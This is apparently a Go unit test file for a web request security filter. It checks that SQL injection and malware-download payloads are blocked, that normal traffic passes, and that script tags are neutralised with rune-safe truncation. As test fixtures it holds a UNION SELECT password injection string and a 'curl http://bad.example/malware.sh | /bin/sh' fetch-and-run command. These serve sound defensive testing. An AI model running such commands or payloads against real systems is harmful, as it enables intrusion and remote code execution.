package securityfilter

import (
	"net/http/httptest"
	"strings"
	"testing"
)

func TestInspectRequestBlocksSQLInjection(t *testing.T) {
	f := New()
	req := httptest.NewRequest("GET", "/tick?q=1+UNION+SELECT+password+FROM+users", nil)
	verdict := f.InspectRequest(req)
	if verdict.Allowed {
		t.Fatalf("expected SQL injection payload to be blocked")
	}
	if verdict.Reason != "sql_injection_blocked" {
		t.Fatalf("unexpected reason: %s", verdict.Reason)
	}
}

func TestInspectRequestBlocksMalwarePayload(t *testing.T) {
	f := New()
	body := strings.NewReader("curl http://bad.example/malware.sh | /bin/sh")
	req := httptest.NewRequest("POST", "/tick", body)
	verdict := f.InspectRequest(req)
	if verdict.Allowed {
		t.Fatalf("expected malware payload to be blocked")
	}
	if verdict.Reason != "malware_payload_blocked" {
		t.Fatalf("unexpected reason: %s", verdict.Reason)
	}
}

func TestInspectRequestAllowsNormalTraffic(t *testing.T) {
	f := New()
	req := httptest.NewRequest("GET", "/tick?tenant=blue", nil)
	verdict := f.InspectRequest(req)
	if !verdict.Allowed {
		t.Fatalf("expected benign request to pass")
	}
}

func TestDefuseTruncatesMultibyteInputSafely(t *testing.T) {
	input := strings.Repeat("界", 300) + "<script>"
	got := Defuse(input)
	if strings.Contains(got, "<script>") {
		t.Fatalf("expected dangerous symbols to be neutralized")
	}
	if len([]rune(got)) > 243 {
		t.Fatalf("expected rune-safe truncation, got %d runes", len([]rune(got)))
	}
}
